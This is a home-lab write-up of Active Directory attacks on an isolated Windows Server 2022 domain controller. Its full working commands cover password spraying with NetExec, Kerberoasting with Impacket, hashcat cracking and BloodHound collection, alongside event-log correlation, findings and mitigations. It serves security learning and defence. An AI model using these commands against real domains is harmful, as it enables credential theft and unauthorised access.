# Cybersecurity Home Lab - Lab 15: Windows Active Directory Attacks

## Overview

This lab builds upon the Active Directory environment created in Lab 14. The objective was to simulate common Active Directory attack techniques against an intentionally configured and isolated Windows Server 2022 domain controller.

The primary attacker system was Kali Linux at `192.168.56.40`, targeting the Active Directory domain controller DC01 at `192.168.56.10`.

The lab focused on:

* Active Directory reconnaissance and enumeration
* Anonymous SMB and LDAP enumeration
* Controlled password spraying
* Kerberos service principal name (SPN) enumeration
* Kerberoasting
* Offline password recovery from a Kerberos service ticket
* Validation of a recovered domain credential
* SMB access using the recovered credential
* SYSVOL enumeration
* Active Directory delegated-permission analysis
* BloodHound attack-path analysis
* Windows Security event validation

The environment was intentionally configured to demonstrate attack techniques safely. No production systems or credentials were involved.

The lab demonstrated a complete Kerberoasting attack chain against a deliberately configured service account:

**SPN discovery → TGS request → Kerberos ticket hash capture → offline password recovery → successful domain authentication**

The lab also demonstrated how an existing delegated Active Directory permission can create an attack path between users without requiring membership in the Domain Admins group.

---

## Objectives

1. Identify the exposed Active Directory services on the domain controller.
2. Test anonymous SMB and LDAP enumeration.
3. Perform authenticated LDAP enumeration using Kerberos.
4. Examine the domain password and account-lockout policy.
5. Conduct a controlled password-spraying exercise.
6. Enumerate Active Directory service principal names.
7. Configure and target an intentionally vulnerable service account for Kerberoasting.
8. Capture a Kerberos service-ticket hash.
9. Perform controlled offline password recovery against the captured hash.
10. Validate the recovered credential against Active Directory.
11. Determine what access the compromised service account provides.
12. Examine SYSVOL access using the recovered credential.
13. Collect Active Directory information with BloodHound.
14. Analyze delegated permissions and potential privilege-escalation paths.
15. Correlate attack activity with Windows Security event logs.
16. Document limitations in attack visibility and telemetry.

---

## Lab Environment

| System       | Role                       | IP Address      | Operating System    |
| ------------ | -------------------------- | --------------- | ------------------- |
| KALI-ATTACK  | Attacker                   | `192.168.56.40` | Kali Linux          |
| DC01         | Domain Controller / DNS    | `192.168.56.10` | Windows Server 2022 |
| UBUNTU-SRV   | AD-integrated Linux system | `192.168.56.30` | Ubuntu 26.04.1 LTS  |
| WIN11-CLIENT | Standalone Windows client  | `192.168.56.20` | Windows 11 Home     |

### Active Directory

* Domain: `home.lab`
* NetBIOS domain: `HOME`
* Domain Controller: `DC01.home.lab`
* Domain SID: `S-1-5-21-2332553809-2485477664-493652705`
* Kali attacker: `192.168.56.40`
* DC01 lab interface: `192.168.56.10/24`

### Lab Accounts

| Account       | Purpose                                                         |
| ------------- | --------------------------------------------------------------- |
| `lab.user`    | Standard domain user used for reconnaissance and authentication |
| `lab.admin`   | Lab administrative test account                                 |
| `lab.service` | Intentionally configured service account used for Kerberoasting |

`lab.service` was intentionally assigned the SPN:

`HTTP/labservice.home.lab`

The account remained a normal domain user and was not granted administrative privileges.

---

## Tools Used

### Kali Linux

* Nmap
* NetExec
* smbclient
* ldapsearch
* ldapwhoami
* Kerberos / `kinit`
* Impacket
* Hashcat
* BloodHound
* BloodHound Python collector

### Windows Server

* Active Directory PowerShell module
* `Get-WinEvent`
* `Get-Acl`
* `setspn`
* Active Directory Users and Computers
* BloodHound-compatible AD data

---

# Implementation Procedure

## 1. Verify Attacker Network Configuration

The Kali system was configured with a Host-Only interface on the isolated lab network.

```bash
ip -br addr
```

The expected lab address was:

```text
eth1    UP    192.168.56.40/24
```

This established the attacker address used throughout the lab.

---

## 2. Verify Connectivity to DC01

Kali tested connectivity to the domain controller:

```bash
ping -c 4 192.168.56.10
```

The test returned:

```text
4 packets transmitted, 4 received, 0% packet loss
```

The average round-trip time was approximately `0.786 ms`.

This confirmed that Kali could communicate with DC01 over the isolated Host-Only network.

---

## 3. Verify Active Directory DNS

The domain name was resolved directly through the domain controller:

```bash
nslookup home.lab 192.168.56.10
```

DC01 returned multiple addresses associated with its network configuration:

* `192.168.56.10`
* `10.0.3.15`
* an IPv6 address

The important result was that DC01 successfully answered the DNS query for `home.lab`.

---

## 4. Enumerate Exposed DC01 Services

Nmap was used to identify TCP services exposed by DC01:

```bash
nmap -Pn -sS -sV 192.168.56.10
```

Notable services included:

| Port | Service                  | Relevance                            |
| ---: | ------------------------ | ------------------------------------ |
|   53 | DNS                      | Active Directory DNS                 |
|   88 | Kerberos                 | Domain authentication                |
|  135 | MSRPC                    | Windows RPC                          |
|  139 | NetBIOS                  | SMB-related services                 |
|  389 | LDAP                     | Directory services                   |
|  445 | SMB                      | Windows file/authentication services |
|  464 | Kerberos password change | Kerberos                             |
|  593 | RPC over HTTP            | Windows RPC                          |
|  636 | LDAPS                    | Secure LDAP                          |
| 3268 | Global Catalog LDAP      | AD forest enumeration                |
| 3269 | Global Catalog LDAPS     | Secure Global Catalog                |
| 5985 | WinRM                    | Windows remote management            |

This confirmed that DC01 exposed the expected Active Directory service surface.

![Nmap DC01 Services](screenshots/01-AD-Nmap-DC01-services.png)

---

## 5. Test Anonymous SMB Enumeration

Kali attempted anonymous SMB share enumeration:

```bash
smbclient -L //192.168.56.10 -N
```

The server reported:

```text
Anonymous login successful
```

However, SMB1 workgroup enumeration failed.

A second test explicitly required SMB2 or newer:

```bash
smbclient -L //192.168.56.10 -N --option='client min protocol=SMB2'
```

The server again accepted the anonymous session but did not provide a list of accessible shares.

SMB1 was reported as disabled.

### Interpretation

Anonymous SMB session establishment was permitted, but the test did **not** establish anonymous access to SYSVOL, NETLOGON, administrative shares, or other domain resources.

![SMB Anonymous Enumeration](screenshots/02-AD-SMB-anon-enum.png)

---

## 6. Test Anonymous LDAP Root-DSE Enumeration

The LDAP root DSE was queried without authentication:

```bash
ldapsearch -x -H ldap://192.168.56.10 -s base -b "" namingContexts
```

The server returned the Active Directory naming contexts, including:

```text
DC=home,DC=lab
CN=Configuration,DC=home,DC=lab
CN=Schema,CN=Configuration,DC=home,DC=lab
DC=DomainDnsZones,DC=home,DC=lab
DC=ForestDnsZones,DC=home,DC=lab
```

The query completed successfully.

### Interpretation

The DC permitted anonymous access to root-DSE metadata.

This does not mean that anonymous users could enumerate the complete directory.

---

## 7. Test Anonymous LDAP User Enumeration

A directory search for user objects was attempted anonymously:

```bash
ldapsearch -x -H ldap://192.168.56.10 \
  -b "DC=home,DC=lab" \
  "(objectClass=user)" \
  sAMAccountName
```

The server returned:

```text
In order to perform this operation a successful bind must be completed
```

### Interpretation

Anonymous LDAP metadata enumeration was possible, but anonymous directory searches were blocked.

This provided a useful distinction between **anonymous LDAP connectivity** and **anonymous directory enumeration**.

**Evidence:** `03-AD-LDAP-anon-user-enum.png`
![LDAP Anonymous User Enumeration](screenshots/03-AD-LDAP-anon-enum.png)

---

## 8. Configure Kerberos Authentication on Kali

Kali was configured to use the AD Kerberos realm:

```text
HOME.LAB
```

The Kerberos configuration specified DC01 as the KDC.

A Kerberos ticket was obtained using:

```bash
kinit lab.user@HOME.LAB
```

The ticket cache was verified with:

```bash
klist
```

A valid ticket-granting ticket was returned:

```text
krbtgt/HOME.LAB@HOME.LAB
```

This established working Kerberos authentication between Kali and the Active Directory domain.

---

## 9. Perform Authenticated LDAP Enumeration

Using the Kerberos ticket, Kali queried Active Directory:

```bash
ldapsearch -Y GSSAPI \
  -H ldap://192.168.56.10 \
  -b "DC=home,DC=lab" \
  "(objectClass=user)" \
  sAMAccountName
```

The query returned domain accounts including:

* `Administrator`
* `Guest`
* `krbtgt`
* `lab.user`
* `lab.admin`
* `lab.service`
* `DC01$`
* `UBUNTU-SRV$`

### Interpretation

Authenticated LDAP provided significantly more directory information than anonymous LDAP.

![Authenicated LDAP Enumeration](screenshots/05-AD-authenticated-LDAP-enum.png)

---

## 10. Examine Domain Password Policy

The domain password and lockout settings were queried:

```bash
ldapsearch -Y GSSAPI \
  -H ldap://192.168.56.10 \
  -b "DC=home,DC=lab" \
  -s base \
  "(objectClass=*)" \
  lockoutThreshold lockoutDuration maxPwdAge
```

The relevant values were:

```text
lockoutThreshold: 0
lockoutDuration: -18000000000
maxPwdAge: -36288000000000
```

These values correspond to:

* Account lockout threshold: **0 — disabled**
* Lockout duration: **30 minutes if lockout were enabled**
* Maximum password age: **42 days**

### Security Observation

A disabled account-lockout threshold can increase exposure to password-guessing and password-spraying techniques because repeated failed authentication does not automatically lock the account.

![Password Policy Attack Baseline](screenshots/06-AD-pass-policy-attack-baseline.png)

---

## 11. Perform Controlled Password Spray

The lab account list contained:

```text
lab.user
lab.admin
lab.service
```

The list was stored temporarily in:

```text
~/ad-users.txt
```

A single password was tested against all three accounts:

```bash
nxc smb 192.168.56.10 \
  -u ~/ad-users.txt \
  -p 'something0.' \
  --continue-on-success
```

Results:

```text
home.lab\lab.user:something0.              SUCCESS
home.lab\lab.admin:something0.             STATUS_LOGON_FAILURE
home.lab\lab.service:something0.           STATUS_LOGON_FAILURE
```

### Interpretation

The controlled password spray successfully authenticated as `lab.user` while failing against the other two accounts.

The test used one password against three intentionally created lab accounts rather than conducting a large password attack.

![Password Spray Attack](screenshots/07-AD-pass-spray.png)

---

## 12. Correlate Password Spray with Windows Security Logs

Immediately after the controlled spray, DC01 was queried for Windows Security events 4624 and 4625.

The relevant events were:

```text
7:54:39 AM    4625    lab.service    3    192.168.56.40
7:54:39 AM    4625    lab.admin      3    192.168.56.40
7:54:39 AM    4624    lab.user       3    192.168.56.40
```

Event meanings:

* `4624` — successful logon
* `4625` — failed logon
* `LogonType 3` — network authentication
* `192.168.56.40` — Kali attacker address

The Windows events independently reproduced the same success/failure pattern shown by NetExec.

### Interpretation

The correlation provides strong evidence that the controlled authentication attempts originated from Kali.

A 4624 event alone does not establish malicious intent; the controlled test and matching source address provide the context.

![Windows Password Spray Events](screenshots/17-AD-Windows-pass-spray-events.png)

---

## 13. Enumerate Service Principal Names

Authenticated LDAP was used to identify user accounts with SPNs:

```bash
ldapsearch -Y GSSAPI \
  -H ldap://192.168.56.10 \
  -b "DC=home,DC=lab" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

Initially, `lab.service` did not have an SPN.

The intentionally vulnerable lab configuration then assigned:

```text
HTTP/labservice.home.lab
```

to `lab.service`.

The SPN was created on DC01 with:

```powershell
setspn -s HTTP/labservice.home.lab lab.service
```

The configuration was verified with:

```powershell
Get-ADUser lab.service -Properties ServicePrincipalName |
    Select-Object SamAccountName, ServicePrincipalName
```

Result:

```text
lab.service    {HTTP/labservice.home.lab}
```

This created the intentionally vulnerable Kerberoasting target.

![SPN Enumeration](screenshots/08-AD-SPN-enum.png)

---

## 14. Perform Kerberoasting

With a valid Kerberos ticket, Impacket was used to request service tickets for discovered SPNs:

```bash
KRB5CCNAME=/tmp/krb5cc_1000 \
impacket-GetUserSPNs \
  -k \
  -no-pass \
  -dc-ip 192.168.56.10 \
  -request \
  -outputfile ~/lab15-kerberoast.txt \
  home.lab/lab.user
```

The tool identified:

```text
HTTP/labservice.home.lab    lab.service
```

The output file contained a Kerberos TGS hash beginning with:

```text
$krb5tgs$23$*lab.service$HOME.LAB$
```

This is an RC4-HMAC Kerberos service-ticket hash.

### Interpretation

The attack demonstrated that a user capable of requesting a service ticket can obtain material that can be subjected to offline password analysis when a vulnerable service account uses an appropriate encryption type.

![Kerberoast Ticket](screenshots/09-AD-Kerberoast-ticket.png)

**Public repository limitation:** The complete Kerberos hash was not included in the public documentation.

---

## 15. Offline Password Recovery

The captured hash was subjected to a controlled offline password test.

Hashcat was initially unable to find a usable compute backend because the lab VM did not expose a GPU/OpenCL device.

The available CPU OpenCL implementation was enabled with:

```bash
RUSTICL_ENABLE=llvmpipe
```

Hashcat then recognized the CPU OpenCL device.

The controlled recovery was performed against the single captured hash:

```bash
RUSTICL_ENABLE=llvmpipe \
hashcat \
  -m 13100 \
  ~/lab15-kerberoast.txt \
  ~/lab15-passwords.txt
```

The result was:

```text
Status: Cracked
Recovered: 1/1 (100%)
```

The recovered credential was validated later through Active Directory authentication.

### Interpretation

This established that the captured service-ticket material was sufficient to recover the intentionally weak lab service-account password through offline analysis.

![Kerberoast Offline Recovery](screenshots/10-AD-Kerberoast-offline-recovery.png)

The recovered password is intentionally omitted from this README and should not be committed to a public repository.

---

## 16. Validate the Recovered Credential

The recovered credential was tested directly against LDAP:

```bash
ldapwhoami -x \
  -H ldap://192.168.56.10 \
  -D "lab.service@home.lab" \
  -W
```

The server returned:

```text
u:HOME\lab.service
```

This confirmed that the recovered password was a valid domain credential.

---

## 17. Validate Windows Authentication Telemetry

A fresh authentication using the recovered credential generated Windows Security events.

The relevant events included:

```text
8:02:17 AM    4624    lab.service    3    192.168.56.40
8:03:13 AM    4624    lab.service    3    192.168.56.40
```

These were successful network authentications originating from Kali.

![Windows Kerberoast Authentication](screenshots/19-AD-Windows-Kerberoast-authentication.png)

---

## 18. Examine Network Authentication Timeline

A broader query filtered authentication events by the Kali IP and network logon type:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id      = 4624,4625
} -MaxEvents 100 |
ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        EventID     = $_.Id
        TargetUser  = ($xml.Event.EventData.Data |
            Where-Object {$_.Name -eq 'TargetUserName'}).'#text'
        LogonType   = ($xml.Event.EventData.Data |
            Where-Object {$_.Name -eq 'LogonType'}).'#text'
        IpAddress   = ($xml.Event.EventData.Data |
            Where-Object {$_.Name -eq 'IpAddress'}).'#text'
    }
} |
Where-Object {
    $_.IpAddress -eq '192.168.56.40' -and
    $_.LogonType -eq '3'
} |
Format-Table -AutoSize
```

The results included the controlled password spray, anonymous SMB activity, and successful `lab.service` authentication.

### Interpretation

The Windows Security log provided a useful timeline of network authentication originating from Kali.

![Windows Network Authentication Timeline](screenshots/22-AD-Windows-network-authentication-timeline.png)

---

## 19. Validate Service Account Access

The recovered `lab.service` credential was tested with NetExec:

```bash
nxc smb 192.168.56.10 \
  -u 'lab.service' \
  -p 'servicepass1.'
```

Authentication succeeded.

The account's SMB share permissions were then enumerated:

```bash
nxc smb 192.168.56.10 \
  -u 'lab.service' \
  -p 'servicepass1.' \
  --shares
```

The account had read access to:

* `IPC$`
* `NETLOGON`
* `SYSVOL`

No administrative permissions were reported.

### Interpretation

The recovered account provided valid domain authentication and read access to standard domain shares, but there was no evidence that the account itself had administrative privileges.

---

## 20. Enumerate SYSVOL

The recovered credential was used to access SYSVOL:

```bash
smbclient //192.168.56.10/SYSVOL -U 'HOME\lab.service'
```

The share contained:

```text
home.lab
DfsrPrivate
Policies
scripts
```

A domain Group Policy object was inspected:

```text
{36F186B7-1064-4FE0-A598-3D01C219CE48}
```

The `Machine` directory contained:

```text
Registry.pol
```

The file was downloaded for inspection.

The file was identified as:

```text
Group Policy Registry Policy, Version=1
```

### Interpretation

The recovered service account could read standard domain Group Policy content through SYSVOL.

This demonstrates that credential compromise can provide access to domain configuration data even when the compromised account does not have administrative privileges.

![SYSVOL GPO Read](screenshots/11-AD-SYSVOL-GPO-read.png)

---

## 21. Collect Active Directory Data with BloodHound

BloodHound was installed and initialized on Kali.

The AD collection was performed using:

```bash
bloodhound-python \
  -c DCOnly \
  -d home.lab \
  -u 'lab.service' \
  -p 'servicepass1.' \
  -ns 192.168.56.10 \
  -dc dc01.home.lab \
  --zip
```

The resulting collection contained information about:

* users
* groups
* computers
* domains
* organizational units
* containers
* Group Policy objects

The collection was imported into BloodHound for analysis.

![Bloodhound Collection](screenshots/12-AD-BloodHound-collection.png)

---

## 22. Analyze the Compromised Service Account

BloodHound showed the following properties for `lab.service`:

* Enabled: TRUE
* Admin Count: FALSE
* Password Never Expires: FALSE
* Password Not Required: FALSE
* Unconstrained Delegation: FALSE
* Trusted for Constrained Delegation: FALSE
* Sensitive: FALSE
* SPN: `HTTP/labservice.home.lab`
* `hasspn`: TRUE

The account was therefore an SPN-bearing standard user account rather than an administrative account.

![Bloodhound Service Account](screenshots/13-AD-BloodHound-service-account.png)

Additional BloodHound object information confirmed the same properties.

![Bloodhound Service Account Properties](screenshots/14-AD-BloodHound-lab-service-properties.png)

---

## 23. Analyze Delegated Permissions

The `lab.admin` account was examined in BloodHound.

BloodHound showed:

* `lab.admin` was a member of `LAB-IT-ADMINS`
* `lab.admin` was not a member of Domain Admins
* `LAB.USER@HOME.LAB` appeared under `Outbound Object Control`

This relationship corresponded to the delegated password-reset permission configured in Lab 14.

![Bloodhound Admin Account Membership](screenshots/15-AD-BloodHound-lab-admin-membership.png)

The outbound control relationship was separately captured:

![Bloodhound Delegated Control](screenshots/16-AD-BloodHound-delegated-control.png)

---

## 24. Validate the Delegated Reset-Password ACL

The underlying Active Directory ACL was queried directly:

```powershell
Import-Module ActiveDirectory
```

The `AD:` PowerShell drive was verified:

```powershell
Get-PSDrive AD
```

The ACL on the `Lab Users` OU was then inspected:

```powershell
Get-Acl "AD:\OU=Lab Users,DC=home,DC=lab" |
Select-Object -ExpandProperty Access |
Where-Object {
    $_.IdentityReference -like "*Lab-IT-Admins*" -and
    $_.ActiveDirectoryRights -match "ExtendedRight"
} |
Select-Object IdentityReference,
    ActiveDirectoryRights,
    AccessControlType,
    ObjectType,
    InheritanceType
```

The result was:

```text
IdentityReference     : HOME\Lab-IT-Admins
ActiveDirectoryRights : ExtendedRight
AccessControlType     : Allow
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritanceType       : Descendents
```

The ObjectType GUID corresponds to the Active Directory **Reset Password** extended right.

### Interpretation

The Windows ACL independently confirms that `Lab-IT-Admins` has permission to reset passwords on descendant objects in the `Lab Users` OU.

This validates the BloodHound relationship at the underlying Active Directory permission level.

![Delegated Password Reset ACL](screenshots/20-AD-delegated-pass-reset-ACL.png)

---

## 25. Revalidate the BloodHound Delegation Path

After the lab systems were restarted, the BloodHound database was reopened and the `lab.admin` object was inspected.

`LAB.USER@HOME.LAB` remained present under `Outbound Object Control`.

This demonstrated that the BloodHound data and relationship persisted after the VM restart.

![Bloodhound delegated control revalidated](screenshots/21-AD-BloodHound-delegated-control-revalidated.png)

---

# Exploitation Results

| Technique                             | Result                                        | Evidence                                                                                       |
| ------------------------------------- | --------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| AD service enumeration                | Successful                                    | `01-AD-Nmap-DC01-services.png`                                                                 |
| Anonymous SMB session                 | Successful, share enumeration not established | `02-AD-SMB-anon-enum.png`                                                                      |
| Anonymous LDAP root-DSE enumeration   | Successful                                    | `03-AD-LDAP-anon-user-enum.png`                                                                |
| Anonymous LDAP user enumeration       | Blocked                                       | `03-AD-LDAP-anon-user-enum.png`                                                                |
| Authenticated LDAP enumeration        | Successful                                    | `05-AD-authenticated-LDAP-enum.png`                                                            |
| Password policy enumeration           | Successful                                    | `06-AD-pass-policy-attack-baseline.png`                                                        |
| Controlled password spray             | `lab.user` authenticated; two failures        | `07-AD-pass-spray.png`                                                                         |
| Windows password-spray telemetry      | Confirmed                                     | `17-AD-Windows-password-spray-events.png`                                                      |
| SPN enumeration                       | Successful                                    | `08-AD-SPN-enum.png`                                                                           |
| Kerberoasting                         | TGS hash captured                             | `18-AD-Kerberoast-ticket-recapture.png`                                                        |
| Offline password recovery             | 1/1 hash recovered                            | `10-AD-Kerberoast-offline-recovery.png`                                                        |
| Recovered credential validation       | Successful                                    | `19-AD-Windows-Kerberoast-authentication.png`                                                  |
| SMB authentication as service account | Successful                                    | Authentication telemetry                                                                       |
| SYSVOL read access                    | Successful                                    | `11-AD-SYSVOL-GPO-read.png`                                                                    |
| BloodHound collection                 | Successful                                    | `12-AD-BloodHound-collection.png`                                                              |
| Service-account privilege analysis    | Normal user; SPN configured                   | `13-AD-BloodHound-service-account.png`                                                         |
| Delegated-control analysis            | Confirmed                                     | `20-AD-delegated-password-reset-ACL.png`, `21-AD-BloodHound-delegated-control-revalidated.png` |

---

# Validation Summary

The lab successfully demonstrated several common Active Directory attack techniques in an isolated environment.

The strongest demonstrated attack chain was the Kerberoasting workflow:

1. An SPN was identified on `lab.service`.
2. A Kerberos service ticket was requested.
3. A `$krb5tgs$23$` artifact was captured.
4. The artifact was subjected to offline password analysis.
5. The password was successfully recovered.
6. The recovered credential successfully authenticated to Active Directory.
7. Windows recorded successful network authentication originating from Kali.
8. The compromised account provided authenticated access to standard domain resources including SYSVOL.

The lab also demonstrated that Active Directory delegation can create an attack path independent of Domain Admin membership. `lab.admin` was a member of `Lab IT Administrators`, and that group possessed the Reset Password extended right over descendants of the `Lab Users` OU.

---

# Analysis

## Kerberoasting Attack Chain

The Kerberoasting exercise demonstrated why service accounts require careful credential management.

The important property was not simply that `lab.service` had an SPN. The account also used an encryption configuration that resulted in an RC4-HMAC TGS response. The resulting ticket material could be obtained by a domain user and analyzed offline without repeatedly authenticating against the domain controller.

The password was intentionally weak for the lab, allowing controlled offline recovery.

The recovered credential then successfully authenticated against LDAP and SMB.

This demonstrates the distinction between:

**Credential exposure** → **credential recovery** → **credential validation** → **resource access**

Each stage was independently validated.

---

## Password Spraying

The password-spray exercise demonstrated a different credential attack model.

Rather than testing many passwords against one account, one password was tested against several accounts. This reduces the number of attempts against each individual account and can be difficult to distinguish from normal authentication activity without appropriate monitoring.

The domain's `lockoutThreshold` was `0`, meaning account lockout was disabled.

Windows Security events provided useful telemetry:

* `4624` for successful authentication
* `4625` for failed authentication
* `LogonType 3` for network authentication
* Kali's `192.168.56.40` as the source

The event correlation demonstrated how endpoint telemetry can help identify authentication activity that occurred over SMB.

---

## Delegation and Attack Paths

The delegated-control analysis demonstrated that privilege escalation opportunities do not always require direct membership in a highly privileged group.

`lab.admin` was a member of:

```text
Lab IT Administrators
```

That group was granted the Reset Password extended right over descendants of:

```text
OU=Lab Users,DC=home,DC=lab
```

BloodHound represented this as outbound object control from `lab.admin` to `lab.user`.

The underlying ACL independently confirmed the permission.

This illustrates why Active Directory security assessments must examine:

* group membership
* delegated permissions
* ACLs
* inherited permissions
* object control relationships

rather than focusing exclusively on Domain Admin membership.

---

## Service Account Exposure

The compromised `lab.service` account remained a normal domain user.

BloodHound showed:

* `Admin Count: FALSE`
* `Unconstrained Delegation: FALSE`
* `Trusted For Constrained Delegation: FALSE`
* `Password Never Expires: FALSE`
* `Password Not Required: FALSE`

No administrative SMB access was established.

This is important because successful credential compromise does not automatically equal full domain compromise.

The demonstrated impact was limited to the privileges and resources available to the compromised account.

---

# Findings

## Finding 1 — Kerberoastable Service Account

**Severity:** High within the isolated lab scenario

**Evidence:**

* SPN `HTTP/labservice.home.lab`
* `$krb5tgs$23$` TGS artifact
* Successful offline password recovery
* Successful LDAP authentication using the recovered credential

**Impact:**

A domain user could request a service ticket for the configured service account and subject the returned material to offline password analysis.

**Limitation:**

The service account was intentionally configured for this lab and intentionally assigned a weak password. The result should not be interpreted as evidence that all production service accounts are similarly vulnerable.

---

## Finding 2 — Disabled Account Lockout

**Severity:** Medium within the lab scenario

**Evidence:**

```text
lockoutThreshold: 0
```

**Impact:**

The domain did not automatically lock accounts after repeated failed authentication attempts.

This increases the opportunity for password-spraying and other authentication attacks.

**Limitation:**

Other controls such as strong passwords, MFA, monitoring, and conditional access can significantly change the practical risk.

---

## Finding 3 — Anonymous LDAP Metadata Enumeration

**Severity:** Low

**Evidence:**

Anonymous root-DSE enumeration returned Active Directory naming contexts.

**Impact:**

An unauthenticated user could obtain basic directory metadata.

**Limitation:**

Anonymous searches for actual user objects were blocked.

---

## Finding 4 — Anonymous SMB Session Establishment

**Severity:** Low / Informational

**Evidence:**

The SMB server accepted an anonymous session.

**Impact:**

The behavior provides some information about the server's SMB configuration.

**Limitation:**

The test did not establish anonymous access to SYSVOL, NETLOGON, administrative shares, or sensitive domain data.

SMB1 was also disabled.

---

## Finding 5 — Delegated Password Reset Permission

**Severity:** Medium within the lab scenario

**Evidence:**

The `Lab-IT-Admins` group possessed the Reset Password extended right over descendants of the `Lab Users` OU.

BloodHound also showed the resulting object-control relationship.

**Impact:**

Members of the delegated group can reset passwords for affected user objects.

**Limitation:**

This permission was intentionally configured during Lab 14 to demonstrate delegation. No unauthorized password reset was performed during this portion of Lab 15.

---

# Security Observations

1. Service accounts with SPNs should use strong, managed credentials.
2. Legacy Kerberos encryption types such as RC4 should be minimized or eliminated where operationally possible.
3. Managed service accounts or group Managed Service Accounts can reduce credential-management risk.
4. Account lockout and authentication protections should be evaluated against password-spraying risk.
5. Authentication events should be monitored for unusual source systems and repeated failures.
6. Active Directory delegation should follow least privilege.
7. ACLs should be periodically reviewed for unintended object-control relationships.
8. SYSVOL should be treated as domain configuration data and protected accordingly.
9. BloodHound-style graph analysis can expose relationships that are difficult to identify from group membership alone.
10. Successful credential compromise does not necessarily mean complete domain compromise; actual impact depends on the compromised account's privileges.

---

# Troubleshooting

## Kerberos DNS Resolution

Kali initially resolved `dc01.home.lab` to an IPv6/NAT-side address despite the Host-Only configuration.

The lab configuration was made deterministic by explicitly configuring the Kerberos KDC address as:

```text
192.168.56.10
```

The existing Kerberos configuration was backed up before modification.

---

## Hashcat OpenCL Backend

Hashcat initially reported that no usable OpenCL, HIP, or CUDA backend was available.

Investigation showed that the Kali VM was using software rendering rather than a physical GPU.

The Rusticl CPU implementation was exposed using:

```bash
RUSTICL_ENABLE=llvmpipe
```

Hashcat then recognized an OpenCL CPU device.

The resulting cracking speed was intentionally low because the operation was performed entirely on the VM's CPU.

---

## BloodHound Graph Queries

The imported legacy `DCOnly` collection successfully exposed object information and relationships through the BloodHound interface.

However, several direct Cypher queries did not return the expected group relationships despite the UI displaying the corresponding object information.

The UI and underlying Active Directory ACL were therefore used as the primary evidence for the delegation relationship rather than relying on unsupported assumptions about the imported graph schema.

---

## Windows 11 Domain Join

The existing Windows 11 client was running Windows 11 Home.

Windows 11 Home does not support joining a traditional on-premises Active Directory domain.

The system therefore remained standalone and was not used as a domain attack target.

---

# Lessons Learned

1. Active Directory exposes a large amount of useful information through standard protocols.
2. Anonymous access should be evaluated separately for SMB and LDAP because different levels of information may be exposed.
3. Password spraying and brute-force attacks have different authentication patterns and detection considerations.
4. Kerberoasting can be performed by a normal domain user when service accounts expose SPNs.
5. Kerberoasting moves much of the password attack offline, reducing the authentication traffic generated during password recovery.
6. Weak service-account passwords can turn a single captured TGS into a valid domain credential.
7. Credential validation is important because a cracked hash should not automatically be treated as proof of successful access.
8. Active Directory ACLs are critical when evaluating privilege escalation.
9. BloodHound is useful for visualizing relationships, but its output should be validated against the underlying AD configuration.
10. Windows Security logs can provide valuable authentication evidence even when network-level monitoring was unavailable.
11. Evidence collection needs to be planned before attacks occur. A sensor that is offline cannot retroactively reconstruct network traffic.
12. A good security assessment documents both what was proven and what could not be proven.

---

# Future Improvements

1. Run Security Onion before beginning attack validation so network traffic and IDS telemetry are captured in real time.
2. Forward Windows Security events into the monitoring environment for centralized correlation.
3. Add a dedicated Windows client running a domain-join-capable edition.
4. Configure additional service accounts with different password strengths and encryption settings to compare Kerberoasting outcomes.
5. Add detection rules for suspicious Kerberos service-ticket requests.
6. Develop Sigma-style detections for password spraying and abnormal authentication sources.
7. Test account-lockout and smart-lockout configurations in a controlled environment.
8. Expand BloodHound collection and compare different collection methods.
9. Add Active Directory Certificate Services in a future lab to investigate AD CS attack paths.
10. Continue the roadmap with Active Directory defensive controls and detection engineering.

---

# MITRE ATT&CK Mapping

| Technique                       | ID        | Lab Application                                    |
| ------------------------------- | --------- | -------------------------------------------------- |
| Account Discovery               | T1087.002 | Enumerated domain users through authenticated LDAP |
| Permission Groups Discovery     | T1069.002 | Examined AD groups and BloodHound relationships    |
| Remote System Discovery         | T1018     | Network service discovery against DC01             |
| Network Service Scanning        | T1046     | Nmap service enumeration                           |
| Valid Accounts: Domain Accounts | T1078.002 | Validated recovered domain credentials             |
| Password Spraying               | T1110.003 | Controlled one-password authentication test        |
| Steal or Forge Kerberos Tickets | T1558.003 | Kerberoasting / service-ticket extraction          |
| Unsecured Credentials           | T1552     | Offline analysis of captured credential material   |
| File and Directory Discovery    | T1083     | SYSVOL and Group Policy enumeration                |
| Windows Admin Shares            | T1021.002 | SMB-based access to Windows services               |
| Domain Trust Discovery          | T1482     | Active Directory/BloodHound domain analysis        |

The mappings describe the techniques demonstrated or analyzed in the lab and do not imply that every technique resulted in broader system compromise.

---

# Cybersecurity Lab Roadmap

| Lab | Topic                       | Status       |
| --: | --------------------------- | ------------ |
|   1 | Build Cybersecurity Lab     | Complete     |
|   2 | Network Discovery with Nmap | Complete     |
|   3 | Wireshark Traffic Analysis  | Complete     |
|   4 | Vulnerability Scanning      | Complete     |
|   5 | Metasploit Framework        | Complete     |
|   6 | Password Attacks            | Complete     |
|   7 | Web Application Security    | Complete     |
|   8 | Windows Logging             | Complete     |
|   9 | Wazuh SIEM                  | Complete     |
|  10 | Security Onion              | Complete     |
|  11 | MITRE ATT&CK Mapping        | Complete     |
|  12 | Detection Engineering       | Complete     |
|  13 | Incident Response           | Complete     |
|  14 | Active Directory            | Complete     |
|  15 | Active Directory Attacks    | **Complete** |
|  16 | Active Directory Defense    | Planned      |
|  17 | Azure Fundamentals          | Planned      |
|  18 | Microsoft Sentinel          | Planned      |